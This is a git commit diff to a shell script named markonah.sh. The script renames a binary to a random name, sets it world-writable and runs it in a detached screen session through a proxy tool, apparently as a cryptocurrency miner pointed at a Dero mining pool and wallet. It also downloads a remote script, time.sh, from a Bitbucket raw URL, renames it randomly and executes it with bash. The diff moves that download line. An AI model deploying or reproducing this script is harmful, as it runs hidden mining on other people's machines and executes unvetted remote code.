3d1be7610217f93e8583a0ef49e565c143987fe5
Tania Putri <lukisanwarna469@gmail.com>
2022-08-29 08:05:17 +0000

    markonah.sh edited online with Bitbucket

--- markonah.sh
+++ markonah.sh
@@ -40,10 +40,10 @@ MARKONAH=$(shuf -i 10000-9999999999 -n 1)
 mv -f Comedy $GOGO
 chmod 777 $GOGO
 
+wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d5659efce0d0dd3/time.sh
 
 screen -S $MARKONAH -dm ./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.MARKONAH &
 screen -ls &
-wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d5659efce0d0dd3/time.sh &
 TIME=$(shuf -i 10000-9999999999 -n 1) &
 mv -f time.sh $TIME &
 bash $TIME
